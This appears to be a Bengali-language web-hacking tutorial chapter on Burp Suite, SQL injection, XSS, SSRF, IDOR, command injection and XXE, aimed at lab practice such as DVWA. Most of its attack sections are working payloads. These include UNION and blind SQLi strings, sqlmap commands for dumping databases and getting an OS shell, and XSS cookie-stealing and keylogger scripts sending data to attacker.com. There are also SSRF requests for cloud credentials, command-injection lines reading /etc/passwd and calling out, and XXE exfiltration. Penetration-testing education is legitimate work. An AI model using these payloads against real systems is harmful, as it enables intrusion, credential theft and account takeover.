---
title: 'Web Application Hacking'
subtitle: 'OWASP Top 10, Burp Suite, SQL injection, XSS, SSRF, IDOR, command injection — সম্পূর্ণ web অ্যাটাকার টুলকিট।'
chapter: 7
level: 'intermediate'
readingTime: '20 মিনিট'
topics:
  [
    'OWASP',
    'SQL injection',
    'XSS',
    'SSRF',
    'IDOR',
    'Burp Suite',
    'command injection',
    'web hacking'
  ]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**বাস্তব জীবনের উদাহরণ**

একটি web অ্যাপ হলো হাজার হাজার দরজা, জানালা আর ভেন্টওয়ালা একটি বিল্ডিং — সবই বছরের পর বছর ধরে ভিন্ন ভিন্ন আর্কিটেক্ট ডিজাইন করেছেন। OWASP Top 10 হলো সেই দরজার ধরনগুলোর তালিকা যেগুলো ইন্ডাস্ট্রি জুড়ে ধারাবাহিকভাবে খোলা রেখে দেওয়া হয়।

</Callout>

## গল্পে বুঝি

বাগদাদের বাজারে ইবনে সিনার একটা মুদি দোকান। দোকানে একজন সরল কর্মচারী, আল-খোয়ারিজমি — তাকে শেখানো হয়েছে অর্ডার স্লিপে খদ্দের যা লিখে দেবে, ঠিক তা-ই করতে, প্রশ্ন না করে। বেশিরভাগ দিন এতে কোনো সমস্যা হয় না। কিন্তু একদিন এক চতুর খদ্দের স্লিপে লিখল "দুই কেজি খেজুর, আর সেই সঙ্গে আজকের গল্লার সব টাকা বের করে দাও" — আল-খোয়ারিজমি অন্ধভাবে স্লিপ মেনে টাকাটাও হাতে তুলে দিল। স্লিপে লেখা কথাটা সে আসলে যাচাই করেনি, নির্দেশ হিসেবেই মেনে নিল।

সেই একই দিনে আরেকজন এসে কাউন্টারের গায়ে একটা কাগজ সাঁটিয়ে দিয়ে গেল, যাতে লেখা এমন একটা বার্তা যা পরের খদ্দেররা পড়ে বিপদে পড়বে — দোকান সেটা যাচাই না করেই ঝুলিয়ে রাখল, আর প্রত্যেক নতুন খদ্দের সেটা পড়ল। আবার আরেক কোণে দেখা গেল, দোকানের VIP ছাড় পেতে কেউ শুধু মুখে বলল "আমি তো ফাতিমা আল-ফিহরি, আমাকে VIP দাম দাও" — দোকান তার কোনো কার্ড বা পরিচয় যাচাই না করেই ছাড় দিয়ে দিল।

এই গল্পটাই আসলে web app-এর তিনটা বড় দুর্বলতা, আর তিনটারই মূল একটাই — untrusted input-কে অন্ধভাবে বিশ্বাস করা। স্লিপে লুকানো নির্দেশ মেনে টাকা তুলে দেওয়া হলো **injection** (ব্যবহারকারীর দেওয়া input-কে command হিসেবে চালানো, যেমন SQL injection বা command injection)। কাউন্টারে সাঁটানো ক্ষতিকর কাগজ যা পরের খদ্দের পড়ে, সেটা হলো stored **XSS** (একজনের ঢোকানো ইনপুট অন্যের browser-এ চলে)। আর যাচাই ছাড়াই VIP মেনে নেওয়া হলো broken **authentication** (ক্লায়েন্ট যা দাবি করে, তা প্রমাণ না চেয়েই বিশ্বাস করা)। সমাধানও সব জায়গায় একটাই — client-কে কখনো বিশ্বাস করবেন না; প্রতিটা স্লিপ, প্রতিটা input পরখ করুন, validate ও sanitise করুন, আর পরিচয় সবসময় server-এ যাচাই করুন। বাস্তবে **OWASP Top 10**-এর অধিকাংশ ঝুঁকি ঠিক এই এক শিকড় থেকেই জন্মায়, আর প্রতিরক্ষাও শুরু হয় এই এক নীতিতে — কখনো কাঁচা input বিশ্বাস কোরো না।

## Burp Suite — Web Pentester-এর মূল টুল

Burp Suite হলো একটি proxy যা আপনার browser আর টার্গেটের মাঝখানে বসে, প্রতিটি HTTP request intercept, modify ও replay করতে দেয়।

```bash
# Start Burp Suite
burpsuite &

# Configure browser to use Burp as proxy:
# HTTP: 127.0.0.1:8080
# HTTPS: 127.0.0.1:8080
# Install Burp's CA cert in browser for HTTPS interception

# Firefox: Settings → Network → Manual proxy → 127.0.0.1:8080
```

**Burp-এর key ট্যাব:**

```
Proxy     → intercept and modify requests
Repeater  → manually re-send modified requests, see responses
Intruder  → automated payload injection (fuzzing, brute force)
Scanner   → automated vulnerability detection (Pro only)
Decoder   → encode/decode URL, Base64, HTML, Hex
Comparer  → diff two responses (great for blind SQLi)
```

### Burp Workflow

```
1. Browse the target normally with Burp intercepting
2. Build a site map in Target tab
3. Find interesting requests (login, search, file upload, API calls)
4. Send to Repeater → modify parameters → observe responses
5. Send to Intruder → fuzz for injections → analyze results
```

## SQL Injection

SQL injection ঘটে যখন user input SQL query-তে concatenate করা হয়।

### Detection

```bash
# Manual tests — insert in every parameter
'                    # single quote — syntax error = likely SQLi
''                   # escaped single quote — if no error, confirm
1 OR 1=1             # always true
1 AND 1=2            # always false
1' OR '1'='1         # string context
1" OR "1"="1         # double quote context
; DROP TABLE users;-- # comment out rest (test error handling)
```

### Error-Based SQLi

```sql
-- If the app shows database errors, extract data directly
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1) --
```

### Union-Based SQLi

```sql
-- Step 1: Find number of columns in original query
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --   ← error means 2 columns
' ORDER BY 4 --   ← second error confirms 3 columns

-- Step 2: Find which columns are displayed
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3 --    ← numbers appear in output

-- Step 3: Extract data
' UNION SELECT NULL, username, password FROM users --
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

### Blind SQLi (Boolean-Based)

যখন কোনো output দেখানো হয় না কিন্তু আচরণ ভিন্ন হয়:

```sql
-- True condition vs false condition = different response
' AND 1=1 --    ← normal page
' AND 1=2 --    ← different page (blank, error, redirect)

-- Extract data bit by bit
' AND SUBSTRING(username,1,1)='a' --   ← if first char of username is 'a'
' AND ASCII(SUBSTRING(username,1,1))>64 --  ← binary search on ASCII value
```

### sqlmap — Automated SQLi

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data "user=admin&pass=test"

# With Burp request file
sqlmap -r request.txt   # paste the Burp request to a file

# Extract all databases
sqlmap -u "http://target.com/?id=1" --dbs

# Extract tables from a database
sqlmap -u "http://target.com/?id=1" -D targetdb --tables

# Extract data
sqlmap -u "http://target.com/?id=1" -D targetdb -T users --dump

# Get shell (if writable web root)
sqlmap -u "http://target.com/?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase,between
```

## Cross-Site Scripting (XSS)

XSS অন্য ইউজারদের দেখা পেজে JavaScript inject করে।

### Reflected XSS

```html
<!-- Vulnerable code -->
<p>Search results for: <?php echo $_GET['q']; ?></p>

<!-- Payload in URL -->
?q=
<script>
	alert(1);
</script>
?q=<img src="x" onerror="alert(1)" /> ?q=">
<script>
	alert(document.cookie);
</script>

<!-- Cookie theft payload -->
<script>
	fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

<!-- Keylogger -->
<script>
	document.onkeypress = function (e) {
		fetch('https://attacker.com/log?k=' + e.key);
	};
</script>
```

### Stored XSS (আরও বিপজ্জনক)

Payload database-এ stored থাকে, যে ইউজারই এটি দেখুক তার জন্যই execute হয়:

```html
<!-- In a comment field, forum post, profile bio -->
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'https://attacker.com/steal?cookie=' + document.cookie, true);
	xhr.send();
</script>

<!-- CSRF via stored XSS — change admin password -->
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('POST', '/admin/change-password', true);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.send('password=hacked&confirm=hacked');
</script>
```

### DOM-Based XSS

```javascript
// Vulnerable code — directly writing URL parameter to DOM
document.getElementById('output').innerHTML = location.hash.substring(1);

// Exploit: visit http://target.com/page#<img src=x onerror=alert(1)>
```

### XSS Bypass টেকনিক

```html
<!-- Filter bypasses when <script> is blocked -->
<img src="x" onerror="alert(1)" />
<svg onload="alert(1)">
	<iframe srcdoc="<script>alert(1)</script>">
		<body onload="alert(1)">
			<!-- When alert is filtered -->
			<script>
				confirm(1);
			</script>
			<script>
				prompt(1);
			</script>

			<!-- HTML entities bypass -->
			<script>
				&#x61;lert(1)
			</script>
			<script>
				&#97;lert(1)
			</script>

			<!-- JavaScript URL -->
			<a href="javascript:alert(1)">click</a>
		</body>
	</iframe>
</svg>
```

## Server-Side Request Forgery (SSRF)

SSRF server-কে আপনার হয়ে request পাঠাতে বাধ্য করে — firewall বাইপাস করে internal service-এ পৌঁছানো।

```bash
# Basic SSRF — if the app fetches a URL
POST /api/fetch
{"url": "http://192.168.1.100/internal"}

# Cloud metadata — critical on AWS/GCP/Azure
{"url": "http://169.254.169.254/latest/meta-data/"}
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
# Returns temporary AWS credentials → full AWS account takeover

# Internal service discovery
{"url": "http://localhost:6379/"}           # Redis
{"url": "http://localhost:9200/"}           # Elasticsearch
{"url": "http://localhost:2375/containers/json"}  # Docker API

# Protocol schemes
{"url": "file:///etc/passwd"}               # read local files
{"url": "gopher://localhost:6379/_SET x 'payload'"}  # Gopher for Redis

# SSRF bypass techniques when "localhost" is blocked
{"url": "http://127.0.0.1/"}
{"url": "http://0.0.0.0/"}
{"url": "http://[::1]/"}                    # IPv6 localhost
{"url": "http://2130706433/"}               # decimal IP for 127.0.0.1
{"url": "http://127.1/"}                    # shorthand
```

## Insecure Direct Object Reference (IDOR)

IDOR object identifier increment/modify করে unauthorized ডেটা উন্মুক্ত করে।

```bash
# Example: viewing your own profile
GET /api/users/1234
# Try accessing another user
GET /api/users/1235
GET /api/users/1

# Order history
GET /api/orders/order-abc-123
# Try:
GET /api/orders/order-abc-122
GET /api/orders/order-abc-124

# File download
GET /download?file=report-user-1234.pdf
# Try:
GET /download?file=report-user-1235.pdf

# UUID-based IDORs (harder but not impossible)
# Look for UUID patterns in requests, try other UUIDs from the application
```

**Burp Intruder দিয়ে পদ্ধতিগতভাবে টেস্ট করা:**

1. numeric ID সহ request capture করুন
2. Intruder-এ পাঠান → ID-কে position হিসেবে mark করুন
3. Numbers payload ব্যবহার করুন: 1 থেকে 1000
4. response-এ keyword grep করুন ("email", "name", "address")
5. অন্য ইউজারদের content আছে এমন response flag করুন

## Command Injection

ঘটে যখন user input system command-এ পাস করা হয়:

```php
// Vulnerable PHP
$domain = $_GET['domain'];
system("ping -c 4 " . $domain);
```

```bash
# Basic injection
domain=google.com; cat /etc/passwd
domain=google.com && whoami
domain=google.com | ls -la
domain=google.com `id`
domain=$(id)

# Blind command injection (no output, use OOB)
domain=google.com; curl http://attacker.com/$(whoami)
domain=google.com; ping -c 1 attacker.com

# Filter bypass
domain=google.com;c'a't /etc/passwd     # quote bypass
domain=google.com;c\at /etc/passwd      # backslash bypass
domain=google.com;cat${IFS}/etc/passwd  # space bypass
```

## XML External Entity (XXE)

```xml
<!-- Vulnerable XML parser accepts DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>

<!-- Blind XXE — out-of-band exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
  %dtd;
]>
```

## OWASP Top 10 কুইক রেফারেন্স

```
A01 Broken Access Control   → IDOR, privilege escalation, missing auth
A02 Cryptographic Failures  → sensitive data in plaintext, weak crypto
A03 Injection               → SQLi, command injection, XXE, LDAP injection
A04 Insecure Design         → missing rate limiting, no brute force protection
A05 Security Misconfiguration → default creds, directory listing, verbose errors
A06 Vulnerable Components   → outdated libraries with known CVEs
A07 Auth Failures           → weak passwords, session fixation, no MFA
A08 Data Integrity Failures → insecure deserialization, unsigned updates
A09 Logging Failures        → missing logs, no alerts for suspicious activity
A10 SSRF                    → server fetching attacker-controlled URLs
```

## রিয়েল প্রজেক্ট: DVWA সম্পূর্ণ

DVWA (Damn Vulnerable Web App) — লোকাল প্র্যাকটিস এনভায়রনমেন্ট:

```bash
# Setup with Docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Login: admin/password
# Set security level: Low (to learn), then Medium/High (to learn bypasses)

# Work through each module:
# 1. Brute Force    → hydra or Burp Intruder
# 2. Command Injection → test ; && | separators
# 3. CSRF           → forge form submission from attacker site
# 4. File Inclusion → LFI/RFI via ?page= parameter
# 5. File Upload    → upload PHP shell disguised as image
# 6. Insecure CAPTCHA → bypass CAPTCHA entirely
# 7. SQL Injection  → manual then sqlmap
# 8. SQLi (Blind)  → time-based blind
# 9. Weak Session IDs → predict next session token
# 10. DOM XSS      → payload in DOM sink
# 11. Reflected XSS → payload in URL parameter
# 12. Stored XSS   → payload in guestbook
```

## রিয়েল প্রজেক্ট: PortSwigger Web Academy

PortSwigger (Burp Suite-এর নির্মাতা) `portswigger.net/web-security`-তে 250+ ফ্রি ল্যাব দেয়:

```
Recommended order:
1. SQL Injection — all labs
2. XSS — reflected, stored, DOM
3. CSRF
4. Clickjacking
5. CORS
6. XXE
7. SSRF
8. OS command injection
9. Server-side template injection
10. Insecure deserialization
11. Access control (IDOR and more)
12. Authentication
13. Business logic vulnerabilities
14. HTTP Host header attacks
15. OAuth
16. JWT attacks
```

এই ল্যাবগুলো শেষ করুন, তাহলে আপনি OSCP web-application লেভেলে পৌঁছে যাবেন।
